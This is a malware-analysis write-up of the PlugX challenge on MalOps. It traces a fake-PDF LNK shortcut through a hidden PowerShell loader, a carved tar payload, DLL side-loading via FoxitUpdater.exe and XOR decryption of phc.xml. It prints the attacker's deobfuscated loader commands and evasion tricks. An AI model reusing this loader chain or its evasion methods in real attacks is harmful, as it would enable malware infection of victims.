---
title: "PlugX — LNK Dropper & Staged Loader Analysis"
published: 2026-10-08
description: "Full analysis of the PlugX MalOps challenge: LNK shortcut, hidden PowerShell loader, embedded tar payload, and DLL sideloading via a signed Foxit binary"
author: "0xV3n0m"
category: "Malware Analysis"
tags: ["Malware Analysis", "Windows", "Reverse Engineering", "PlugX", "LNK"]
image: "/assets/img/plugx.png"
draft: false
lang: "eng"
---
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
<div style="line-height:1.9; font-size:21px; direction:ltr;">
<hr>

<p>
<b>بسم الله، الحمد لله حمدًا طيبًا مباركًا يليق بجلاله وعظيم سلطانه، والصلاة والسلام على نبينا محمد ﷺ، الذي بلّغ الرسالة وأدّى الأمانة وجاهد في الله حق جهاده.</b>
</p>
<p>
I'm <b style="color:cornflowerblue;">Ahmed Allah Mohamed</b>, aka <b style="color:cornflowerblue;">0x_V3N0M</b>.
</p>
<p>
A ZIP file. A PDF icon. A Vietnamese filename dressed up as an internal company notice. It's exactly the kind of message that makes you click before you think.
</p>
<p>
But nothing in this file is what it claims to be. The "PDF" is a shortcut, the shortcut is a launcher, and somewhere inside a decoy, something is waiting to be pulled out.
</p>
<p>
This is my write-up for the <b style="color:cornflowerblue;">PlugX</b> challenge on <b style="color:cornflowerblue;">MalOps</b>. A suspected infection, a trail that starts with a single click, and a chain of stages that each hide the next one a little better than the last. I won't spoil where it leads. Let's follow it, one layer at a time.
</p>
<p>
So, enough talking. <b style="color:cornflowerblue;">Let's open the file nobody should open.</b>
</p>
<img src="/assets/img/plugx_welcome.gif" alt="let's go" style="display:block; margin:20px auto; border-radius:12px; max-width:60%;">

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>The shortcut that isn't a PDF</b></h2>

<p>
I started where every investigation starts: with the file I was handed. The challenge ships as a single archive named <code style="color:chartreuse;">Tin_buồn_PGĐ_Công_ty.pdf.zip</code>. The name pretends to be a PDF, but the <code style="color:chartreuse;">.zip</code> at the end says otherwise, so I didn't trust either and opened it.
</p>
<p>
I extracted the archive with WinRAR, and it showed exactly one entry. No second file, no folder tree, nothing else. Listing the extracted folder from WSL confirmed it:
</p>

```bash
ls
```

<img src="/assets/img/plugx_q1.png" alt="extracted archive listing" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
<i>The extracted archive contains a single file, Tin_buồn_PGĐ_Công_ty.pdf.lnk. The highlighted extension is not .pdf.</i>
</p>
<p>
The name still carries ".pdf", but that is just part of the filename. What decides the file type is whatever follows the last dot, and here that's <code style="color:chartreuse;">.lnk</code>.
</p>

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q1 — What is the actual file extension of the provided malware sample?</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">.lnk</code></b>
</p>
<p>
A <code style="color:chartreuse;">.lnk</code> file is a Windows shortcut. It doesn't contain a document  it contains instructions: what to launch and with which arguments. That makes it a convenient disguise. Windows Explorer hides the <code style="color:chartreuse;">.lnk</code> extension, so the victim sees only "...pdf", and the shortcut's icon can be set to look like a PDF. It also tells us where the analysis has to start: not with a disassembler, but with a parser that can read the command the shortcut is hiding.
</p>

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>What the shortcut really runs</b></h2>

<p>
With the extension settled, the next question was the one every shortcut raises: what does it actually launch? A <code style="color:chartreuse;">.lnk</code> is a data file, not a program, which is why my first attempt went nowhere. Loading it into IDA simply opened <code style="color:chartreuse;">cmd.exe</code>, the shortcut's target, instead of any malicious code. So I parsed the shortcut instead:
</p>

```bash
lnkparse Tin_buồn_PGĐ_Công_ty.pdf.lnk
```

<img src="/assets/img/plugx_q2.png" alt="lnkparse output" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
<i>(1) The command used. (2) The <code style="color:chartreuse;">-W h</code> flag inside the PowerShell command line stored in the shortcut's arguments.</i>
</p>
<p>
The target is <code style="color:chartreuse;">C:\Windows\System32\cmd.exe</code>, and the interesting part is the command line stored with it:
</p>

```powershell
/c  PoweRshEll  -W  h "; [SyStem.IO.File]::OpenReAd($kbonw);...
```

<p>
Two things stand out. The shortcut doesn't run PowerShell directly it goes through <code style="color:chartreuse;">cmd /c</code>. And almost nothing in the command line is spelled the standard way: the casing is scrambled (<code style="color:chartreuse;">PoweRshEll</code>), and the flag is abbreviated. The output also shows the shortcut's own window style: <code style="color:chartreuse;">SW_SHOWNORMAL</code>.
</p>

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q2 — Which PowerShell flag is used by the attacker to ensure the console window remains hidden from the user during execution?</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">-W h</code></b>
</p>
<p>
PowerShell accepts any unambiguous prefix of a parameter name. <code style="color:chartreuse;">-W</code> is shorthand for <code style="color:chartreuse;">-WindowStyle</code>, and <code style="color:chartreuse;">h</code> is shorthand for its <code style="color:chartreuse;">Hidden</code> value, so <code style="color:chartreuse;">-W h</code> is <code style="color:chartreuse;">-WindowStyle Hidden</code> in its shortest form. This matters because the shortcut itself is set to <code style="color:chartreuse;">SW_SHOWNORMAL</code>, so nothing about the shortcut hides the console. The flag is what keeps the PowerShell window out of the victim's sight.
</p>
<p>
The abbreviation and the mixed case aren't just style. A detection rule looking for the literal string <code style="color:chartreuse;">-WindowStyle Hidden</code> or <code style="color:chartreuse;">powershell</code> won't match <code style="color:chartreuse;">PoweRshEll -W h</code>, which is exactly the kind of cheap evasion this command line is built on.
</p>

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>Hunting for the archive it came from</b></h2>

<p>
Reading the command line more carefully, the first thing the script does is go looking for something: the ZIP archive the shortcut was delivered in. After removing the case scrambling (<code style="color:chartreuse;">lS</code>, <code style="color:chartreuse;">-Pa</code>, <code style="color:chartreuse;">-Re</code>, <code style="color:chartreuse;">-in</code>), that first line reads as a recursive file search under the user's profile:
</p>

```powershell
ls -Path $Home -Recurse -Include 'Tin_buo??n_PG?_Co?ng_ty.pdf.zip'
```

<p>
The first match is then used to rebuild the archive's full path from its directory name and the same filename.
</p>
<img src="/assets/img/plugx_q3.png" alt="wildcard mask in command line" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
The shortcut doesn't carry the payload with it. It assumes the original archive is still on disk somewhere under the user's profile, and it finds it on its own: because the search is recursive, it doesn't matter whether the victim extracted the file from Downloads, the Desktop, or anywhere else below <code style="color:chartreuse;">$Home</code>.
</p>

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q3 — The script searches the user's home directory for a specific ZIP archive using a wildcard mask. What is the exact mask used?</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">Tin_buo??n_PG?_Co?ng_ty.pdf.zip</code></b>
</p>

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>A payload buried inside the ZIP</b></h2>

<p>
Reading further into the command line, the script stops being a search and starts being a loader. Once the archive is found, it opens it and reads every byte into memory, then does something no archive tool would do: it slices a block of bytes out of the raw file and writes them to disk.
</p>
<p>
After stripping the case scrambling and the string splitting (<code style="color:chartreuse;">'Writ'+'EAlLb'+'ytEs'</code> is just <code style="color:chartreuse;">WriteAllBytes</code>), the relevant part reads:
</p>

```powershell
$eiij = [System.IO.File]::OpenRead($kbonw)       # the ZIP found earlier
$obbqvvv = New-Object byte[] $eiij.Length
$eiij.Read($obbqvvv, 0, $obbqvvv.Length)         # whole ZIP in memory
$rslf = 975
[System.IO.File]::WriteAllBytes($Home + '\aqdk.cp', $obbqvvv[$rslf..(7726592+$rslf-1)])
```

<img src="/assets/img/plugx_q4.png" alt="loader logic offset 975" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
<i>The loader logic in the shortcut's command line. The highlighted <code style="color:chartreuse;">$rslf=975</code> is the start of the slice cut out of the ZIP.</i>
</p>
<p>
The ZIP is read as a plain byte array, so the slice has nothing to do with the archive's structure: no file entries, no decompression. It starts at a fixed position, and that position is the variable <code style="color:chartreuse;">$rslf</code>. The range <code style="color:chartreuse;">[$rslf..(7726592+$rslf-1)]</code> is inclusive, so it takes exactly 7,726,592 bytes (about 7.4 MiB) from that point, and writes them to <code style="color:chartreuse;">aqdk.cp</code> in the user's profile.
</p>
<p>
This is where the first screenshot pays off. When I opened the archive in WinRAR, it listed a single entry the shortcut. The payload isn't one of the entries the archive advertises. It sits in the same file, and only the shortcut knows where to look.
</p>

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q4 — The malicious payload is embedded within another file. At what byte offset does the extraction of this payload begin?</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">975</code></b>
</p>

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>How much does it take?</b></h2>

<p>
The offset only says where the cut starts. The second half of the slice — the range expression — says how far it goes:
</p>

```powershell
$obbqvvv[$rslf..(7726592+$rslf-1)]
```

<img src="/assets/img/plugx_q5.png" alt="slice length 7726592" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
<i>The length of the slice inside the range expression. The highlighted value, <code style="color:chartreuse;">7726592</code>, is the number of bytes cut out of the ZIP.</i>
</p>
<p>
The range runs from <code style="color:chartreuse;">$rslf</code> to <code style="color:chartreuse;">7726592 + $rslf - 1</code>. PowerShell ranges include both ends, so the number of bytes is the end index minus the start index plus one. The <code style="color:chartreuse;">+$rslf</code> and the <code style="color:chartreuse;">-1</code> cancel out exactly that way, and what remains is the highlighted number. With the start at 975, the slice ends at index 7,727,566.
</p>
<p>
I didn't want to take the script's word for it, so I cut the same range out myself with <code style="color:chartreuse;">dd</code>, using the offset and the count from the command line. It copied 7,726,592 bytes, which <code style="color:chartreuse;">dd</code> reported as 15,091 full blocks of 512 bytes. That is a useful sanity check: 7,726,592 is an exact multiple of 512, and tar archives are built from 512-byte blocks.
</p>

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q5 — How many bytes of data are extracted from the source file to create the stage-2 payload?</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">7726592</code></b>
</p>
<p>
That is about 7.4 MiB, written out as <code style="color:chartreuse;">aqdk.cp</code> in the victim's profile. The slice also fits inside the archive with room to spare: my copy of the ZIP is 7,727,670 bytes, so the slice stops 103 bytes before the end of the file. Those last bytes are consistent with the ZIP's own directory structure, which would explain why archive tools never mention the payload sitting in front of it.
</p>

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>Unpacking the payload</b></h2>

<p>
With the slice written to <code style="color:chartreuse;">aqdk.cp</code>, the script's next move is a single command — the tail end of the command line:
</p>

```powershell
tAR -xvf $Home\aqdk.cp -C $Home; Sleep -Seconds 4; powershell $Home\IFIR-7R-I2R8\FoxitUpdater.exe
```

<img src="/assets/img/plugx_q6.png" alt="tar extraction command and directory name" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
<i>The end of the command line. The highlighted directory name, <code style="color:chartreuse;">IFIR-7R-I2R8</code>, appears in the path of the executable the script launches after extraction.</i>
</p>
<p>
The <code style="color:chartreuse;">-C $Home</code> flag tells <code style="color:chartreuse;">tar</code> to extract into the user's profile folder, and the script then waits four seconds — enough for the extraction to finish — before launching an executable from inside a directory it never creates. That directory has to come from the archive itself, so the script's author knew the exact name when writing the command line.
</p>
<p>
I wanted to see this without extracting anything, so I carved the same range out of the ZIP myself and asked <code style="color:chartreuse;">tar</code> only to list its contents:
</p>

```bash
dd if="Tin_buồn_PGĐ_Công_ty.pdf.zip" of=aqdk.cp iflag=skip_bytes,count_bytes skip=975 count=7726592
tar -tvf aqdk.cp
```

<img src="/assets/img/plugx_q6b.png" alt="tar listing of aqdk.cp" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
<i>Carving the payload by hand and listing it. The archive's first entry is the directory <code style="color:chartreuse;">IFIR-7R-I2R8/</code>, followed by the files it holds.</i>
</p>
<p>
The listing confirms it: the first entry in the archive is the directory itself, followed by what it holds — an executable and a subfolder named <code style="color:chartreuse;">plugins</code>.
</p>

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q6 — After the archive is extracted using the 'tar' command, which specific directory is created to house the payload?</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">IFIR-7R-I2R8</code></b>
</p>
<p>
Two details are worth noting. First, the script depends on the <code style="color:chartreuse;">tar</code> utility that ships with modern Windows, so it needs no extra tooling and no downloaded file other than the archive the victim already has. Second, the directory is created at the root of the user's profile (<code style="color:chartreuse;">C:\Users\&lt;name&gt;\IFIR-7R-I2R8</code>), and its name means nothing — which makes it a strong indicator for hunting: a folder with this name next to an <code style="color:chartreuse;">aqdk.cp</code> file is a clear sign this chain has run.
</p>

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>Borrowing a trusted name</b></h2>

<p>
The last piece of the command line is the one that matters most. After the archive is unpacked and the script waits four seconds, it launches a single executable from the new directory:
</p>

```powershell
powershell $Home\IFIR-7R-I2R8\FoxitUpdater.exe
```

<img src="/assets/img/plugx_q7.png" alt="FoxitUpdater.exe launch command" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
<i>The final command in the shortcut's arguments. The highlighted <code style="color:chartreuse;">FoxitUpdater.exe</code> is the only program the script launches.</i>
</p>
<p>
Everything before this point was preparation: finding the archive, slicing out the payload, unpacking it. This is the moment the chain actually starts running something. The script doesn't launch it directly — it hands the path to another PowerShell instance, which executes it.
</p>
<p>
The name is chosen with care. "Foxit" is a well-known PDF reader vendor, and the shortcut we started from was dressed up as a PDF, so an updater from a PDF vendor lands in the victim's mind as an ordinary side effect of opening a document. The tar listing confirmed the same file at the top of the extracted directory — 7,199,216 bytes in size — sitting next to a <code style="color:chartreuse;">plugins</code> folder.
</p>

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q7 — To evade detection, the attacker uses a legitimate, digitally signed binary. What is the filename of this executable?</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">FoxitUpdater.exe</code></b>
</p>
<p>
Security tooling gives signed executables from known vendors a lot of trust: they're rarely blocked, rarely flagged, and their processes look routine in a process tree. An attacker who can get such a program to run gets that trust for free. The program itself doesn't have to be malicious. What matters is what it loads, and the <code style="color:chartreuse;">plugins</code> folder beside it is where the next stage picks up.
</p>

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>What the signed binary loads</b></h2>

<p>
<code style="color:chartreuse;">FoxitUpdater.exe</code> is the signed host, but the script never touches it again after launching it. What it runs is decided by the folder it was unpacked with, so I went back to the tar listing I made earlier and looked at what sits beside it:
</p>

```
IFIR-7R-I2R8/FoxitUpdater.exe        7,199,216 bytes
IFIR-7R-I2R8/plugins/phc.dll           140,288 bytes
IFIR-7R-I2R8/plugins/phc.xml           383,404 bytes
```

<img src="/assets/img/plugx_q8.png" alt="plugins folder contents" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
<i>The <code style="color:chartreuse;">plugins</code> folder inside the unpacked directory. It holds exactly two files with the same base name and different extensions: <code style="color:chartreuse;">phc.dll</code> and <code style="color:chartreuse;">phc.xml</code>.</i>
</p>
<p>
The <code style="color:chartreuse;">plugins</code> folder holds two files with the same base name. The <code style="color:chartreuse;">.dll</code> is small at 140 KB, and the <code style="color:chartreuse;">.xml</code> is almost three times larger. An XML file of 383 KB with an arbitrary name is already unusual — and I came back to it later. For the question at hand, the DLL is the one that can execute code.
</p>

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q8 — What DLL does FoxitUpdater.exe dynamically load from the 'plugins' directory?</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">phc.dll</code></b>
</p>
<p>
This is the classic DLL side-loading setup: a trusted, signed executable placed next to a DLL the attacker controls, so that when the program looks for one of its plugins, it picks up the attacker's copy. The malicious code then runs inside a process whose name and signature look routine.
</p>

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>Inside the loader DLL</b></h2>

<p>
With <code style="color:chartreuse;">phc.dll</code> identified as the file the signed executable loads, I opened it in IDA Pro to see what it exposes. A DLL can only be used by other code through its exports, so the Exports tab is the first thing to read.
</p>
<img src="/assets/img/plugx_q9.png" alt="phc.dll exports in IDA" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
<i>Exports of <code style="color:chartreuse;">phc.dll</code> in IDA. Two named exports — <code style="color:chartreuse;">CreateCheckLicense</code> (ordinal 1, <code style="color:chartreuse;">0x100012D7</code>) and <code style="color:chartreuse;">DestroyCheckLicense</code> (ordinal 2, <code style="color:chartreuse;">0x100012D4</code>) — plus <code style="color:chartreuse;">DllEntryPoint</code> as the module's entry.</i>
</p>
<p>
Two things stand out. The export names, <code style="color:chartreuse;">CreateCheckLicense</code> and <code style="color:chartreuse;">DestroyCheckLicense</code>, read like a license-validation plugin interface — a harmless-looking disguise for a DLL sitting in a PDF vendor's <code style="color:chartreuse;">plugins</code> folder. And the two exports sit only three bytes apart (<code style="color:chartreuse;">0x100012D4</code> and <code style="color:chartreuse;">0x100012D7</code>), so <code style="color:chartreuse;">DestroyCheckLicense</code> can hold at most a trivial stub.
</p>
<p>
<code style="color:chartreuse;">CreateCheckLicense</code> is where the real work starts. Opening it in the decompiler shows a nested loop of 10,000 × 1,000 iterations that does arithmetic and uses the result for nothing, followed by a single call into the rest of the DLL:
</p>

```c
int CreateCheckLicense()
{
  ...
  for ( i = 0; i != 10000; ++i )
  {
    v1 = 1000;
    v2 = 0;
    do
    {
      v4 = (v2 + v4) % 1000000;   // pointless computation — result is never used
      v2 += i;
      --v1;
    }
    while ( v1 );
  }
  sub_1000113F();   // actual malicious logic starts here
  return 0;
}
```

<img src="/assets/img/plugx_q9b.png" alt="CreateCheckLicense decompiled" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
The export doesn't validate anything. It burns time and then hands control to the code that continues the chain.
</p>

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q9 — Which exported function from phc.dll is used by the malware during execution?</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">CreateCheckLicense</code></b>
</p>
<p>
<code style="color:chartreuse;">DllEntryPoint</code> is listed too, but it isn't an export in the same sense: the system calls it automatically when the DLL is loaded. <code style="color:chartreuse;">CreateCheckLicense</code> is the exported function whose body leads onward into the malicious logic.
</p>

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>Stalling for time</b></h2>

<p>
The loop in <code style="color:chartreuse;">CreateCheckLicense</code> deserves a closer look, because it doesn't compute anything the rest of the program needs:
</p>

```c
for ( i = 0; i != 10000; ++i )
{
  v1 = 1000;
  v2 = 0;
  do
  {
    v4 = (v2 + v4) % 1000000;   // v4 is never read after the loops finish
    v2 += i;
    --v1;
  }
  while ( v1 );
}
sub_1000113F();   // only line that matters
```

<p>
The outer loop runs 10,000 times and the inner one 1,000 times, so the body executes 10,000,000 times. Each pass does a bit of addition and a modulo, and <code style="color:chartreuse;">v4</code> is never read after the loops finish. The calculation exists to burn CPU time, nothing else.
</p>
<p>
That is a deliberate delay. Automated analysis environments only watch a sample for a limited time, and a program that does nothing visible for long enough can outlast that window. Using arithmetic instead of a <code style="color:chartreuse;">Sleep</code> call has one more advantage: a sandbox can fast-forward or skip a sleep, but it can't skip real computation without breaking the program.
</p>
<p>
I checked how MITRE ATT&CK classifies this behavior. The page for Delay Execution describes adversaries using loops and needless repetitions of commands to delay execution beyond the time thresholds of automated analysis — which matches the pattern above.
</p>
<img src="/assets/img/plugx_q10.png" alt="MITRE ATT&CK T1678 Delay Execution" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q10 — The malware implements a computationally intensive loop to stall execution. Which MITRE ATT&CK technique ID describes this behavior?</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">T1678</code></b>
</p>

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>The file that isn't XML</b></h2>

<p>
In the <code style="color:chartreuse;">plugins</code> folder, <code style="color:chartreuse;">phc.dll</code> had a sibling I flagged earlier: <code style="color:chartreuse;">phc.xml</code>. A DLL's neighbors are worth a second look, so I opened the folder and compared them.
</p>
<img src="/assets/img/plugx_q11.png" alt="plugins folder with phc.xml highlighted" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
Two things don't fit a real XML file. The first is size: from the tar listing, <code style="color:chartreuse;">phc.xml</code> is 383,404 bytes — almost three times larger than the DLL it shares a name with. The second is its content. I looked at the first bytes with <code style="color:chartreuse;">ndisasm</code>:
</p>

```bash
ndisasm -b 32 phc.xml | head -60
```

<img src="/assets/img/plugx_q11b.png" alt="first bytes of phc.xml" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
A genuine XML document begins with readable text, usually <code style="color:chartreuse;">&lt;?xml</code> or a tag. This file begins with <code style="color:chartreuse;">40 48 66 A9 C6 BA 90 E8 00 00 04 00</code> — which isn't text at all. Further in there is a long stretch of identical <code style="color:chartreuse;">0xB5</code> bytes. Data that is properly random doesn't repeat one value dozens of times in a row, so this looks like structured data that has been transformed with a fixed key, with its empty padding turning into the repeating byte.
</p>

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q11 — Which file is used as the encrypted container for the Stage-3 payload?</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">phc.xml</code></b>
</p>
<p>
The name is the camouflage. A file called <code style="color:chartreuse;">phc.xml</code> next to <code style="color:chartreuse;">phc.dll</code> looks like configuration data for the plugin, and a human or a scanner skimming the folder has no reason to open it.
</p>

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>Hiding the imports</b></h2>

<p>
Past the stall loop, the DLL's behavior gets harder to read. The cause is easy to spot once you look at the imports: the interesting Windows functions it needs (file access, memory allocation, threads, networking) don't appear as imports at all. Instead of linking against them normally — which would put their names in the file for any scanner to read — the malware resolves them at runtime using <b style="color:cornflowerblue;">API hashing</b>: store a number in place of each function name, and have a small routine find the real function by walking the loaded modules and matching hashes.
</p>
<p>
That routine is called many times, once per API. I ranked the functions of the DLL by how many call sites point at them, skipping the compiler's library code:
</p>

```python
import idautils, idc
res = []
for f in idautils.Functions():
    if idc.get_func_attr(f, idc.FUNCATTR_FLAGS) & idc.FUNC_LIB:
        continue
    n = len(list(idautils.CodeRefsTo(f, 0)))
    res.append((n, f, idc.get_func_name(f)))
for n, f, name in sorted(res, reverse=True)[:15]:
    print("%d xrefs   0x%X   %s" % (n, f, name))
```

<p>
The top entry, with 55 references, is <code style="color:chartreuse;">nullsub_1</code> — an empty function — so I ignored it. The next one is <code style="color:chartreuse;">sub_1000133C</code>, with 15 references.
</p>
<img src="/assets/img/plugx_q12.png" alt="IDA cross-reference count output" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
The function looks like what I was after. Its signature takes two integers, and its first local is a <code style="color:chartreuse;">struct _PEB_LDR_DATA *Ldr</code>. In the disassembly, the function reads <code style="color:chartreuse;">fs:30h</code>, which on 32-bit Windows is the pointer to the <b style="color:cornflowerblue;">Process Environment Block</b> — the data structure that lists every module loaded in the process. Reading the loader list directly from the PEB, instead of calling <code style="color:chartreuse;">GetModuleHandle</code> or <code style="color:chartreuse;">GetProcAddress</code>, is the standard way to resolve APIs without leaving them in the import table.
</p>
<p>
Stripped of noise, the function does three things: it walks the list of loaded modules from the PEB and matches the first argument against a hash of each module's name; once the module matches, it reads that module's export table; it hashes each export name and compares it with the second argument, returning the function's address on a match.
</p>
<p>
The hash is simple: for each character it rotates the running value left by 6 bits and adds the character after converting lowercase to uppercase. Callers of this function resolve APIs such as <code style="color:chartreuse;">GetModuleFileNameW</code>, <code style="color:chartreuse;">NtCreateFile</code>, <code style="color:chartreuse;">NtReadFile</code>, <code style="color:chartreuse;">VirtualAlloc</code> and <code style="color:chartreuse;">RtlRegisterWait</code> through it.
</p>

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q12 — What is the address of the API hash resolver function?</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">0x1000133C</code></b>
</p>
<p>
This single function is the key to reading the rest of the DLL. Wherever the code calls a Windows API, the call goes through <code style="color:chartreuse;">sub_1000133C</code> with two constants in place of names, and the result is stored in a function pointer. Once the hashing scheme is known, those constants can be turned back into API names.
</p>

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>Cracking the container</b></h2>

<p>
I had already flagged <code style="color:chartreuse;">phc.xml</code> as the container. Its first bytes weren't text, and further in there was a long stretch of the same value, <code style="color:chartreuse;">0xB5</code>. That repetition is the useful part. Real PE files contain large blocks of zero padding, and if a fixed key was combined with those zeros, the key itself would show through, repeated. So I took <code style="color:chartreuse;">0xB5</code> as the candidate key.
</p>
<p>
Before choosing an operation, I needed a known plaintext to test against. Every PE file starts with <code style="color:chartreuse;">MZ</code> (<code style="color:chartreuse;">4D 5A</code>), so I took the bytes right after the first <code style="color:chartreuse;">call</code> in the file (offset <code style="color:chartreuse;">0x0C</code>) and tried the plausible operations with that key:
</p>

```python
b = bytes.fromhex("F8EF5DB5B5B5B5EEE7F0E03E5934762DBBB5B54A667C76")
print("xor B5 :", bytes(x ^ 0xB5 for x in b).hex(" "))
print("add 4B :", bytes((x + 0x4B) & 0xFF for x in b).hex(" "))
print("sub B5 :", bytes((x - 0xB5) & 0xFF for x in b).hex(" "))
```

```
xor B5 : 4d 5a e8 00 00 00 00 5b 52 45 55 8b ec 81 c3 98 0e 00 00 ff d3 c9 c3
add 4B : 43 3a a8 00 00 00 00 39 32 3b 2b 89 a4 7f c1 78 06 00 00 95 b1 c7 c1
sub B5 : 43 3a a8 00 00 00 00 39 32 3b 2b 89 a4 7f c1 78 06 00 00 95 b1 c7 c1
```

<img src="/assets/img/plugx_q13.png" alt="three decoding attempts" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
The addition and subtraction candidates produce nothing recognizable. XOR with <code style="color:chartreuse;">0xB5</code> produces <code style="color:chartreuse;">4D 5A</code> — the <code style="color:chartreuse;">MZ</code> signature — followed by instructions that make sense in sequence: <code style="color:chartreuse;">E8 00 00 00 00</code> is <code style="color:chartreuse;">call $+5</code>, then <code style="color:chartreuse;">5B</code> is <code style="color:chartreuse;">pop ebx</code>, <code style="color:chartreuse;">52 45 55</code> is <code style="color:chartreuse;">push edx / inc ebp / push ebp</code>, and <code style="color:chartreuse;">8B EC</code> is <code style="color:chartreuse;">mov ebp, esp</code>. A single byte key producing a valid PE header plus coherent code across 23 bytes is not something that happens by accident. It also explains the run of <code style="color:chartreuse;">B5</code> bytes: <code style="color:chartreuse;">00 ^ B5 = B5</code>.
</p>
<p>
I then applied the same operation to the whole region and saved the result as <code style="color:chartreuse;">stage3.bin</code>:
</p>

```python
d = open("phc.xml", "rb").read()
open("stage3.bin", "wb").write(bytes(b ^ 0xB5 for b in d[0x0C:0x4000C]))
```

<img src="/assets/img/plugx_q13b.png" alt="decrypted PE parses cleanly" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p>
The result isn't only a valid header: a PE parser reads its section table and import table without complaint, and I could open the file in IDA with a sensible image base. So the key holds for the entire region.
</p>

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q13 — Which bitwise operation is used to decrypt the Stage-3 payload?</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">XOR</code></b>
</p>

<hr>

<h2 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'"><b>Where the key comes from</b></h2>

<p>
The operation was XOR. The key is the byte it was applied with — and I didn't have to search for it. It showed up in the file before I understood it: a long run of identical <code style="color:chartreuse;">0xB5</code> bytes in the raw <code style="color:chartreuse;">phc.xml</code>. XOR has a useful property here: any byte XORed with zero comes out unchanged, and PE files carry large blocks of zero padding. If a single-byte key was applied to the whole file, the padding would turn into that key, repeated. A run of the same value was the key showing through.
</p>
<p>
I confirmed it with known plaintext: decrypting the first bytes after the opening <code style="color:chartreuse;">call</code> with <code style="color:chartreuse;">0xB5</code> produced exactly <code style="color:chartreuse;">MZ</code>, followed by coherent instructions. Applying the same key to the whole region gave a file that a PE parser reads cleanly — sections and imports included. A rolling or multi-byte key would have broken that somewhere along the way.
</p>

<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Q14 — What is the decryption key used for the Stage-3 payload? (hex)</h2>

<p>
<b style="color:cornflowerblue;">Answer: <code style="color:chartreuse;">0xB5</code></b>
</p>
<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Imports that aren't there</h2>
 
<p>
With the Stage-3 DLL decrypted, I opened <code style="color:chartreuse;">stage3.bin</code> in IDA and looked at its import table first. A program that talks to the registry and the network normally links against the libraries that provide those functions, and they show up in the import list. This one doesn't. The parser lists only two libraries:
</p>
 
```python
import pefile
pe = pefile.PE("stage3.bin")
for e in pe.DIRECTORY_ENTRY_IMPORT:
    names = [i.name.decode() for i in e.imports if i.name]
    print(e.dll.decode(), len(names))
```
 
```
KERNEL32.dll 66
USER32.dll 2
```
 
<p>
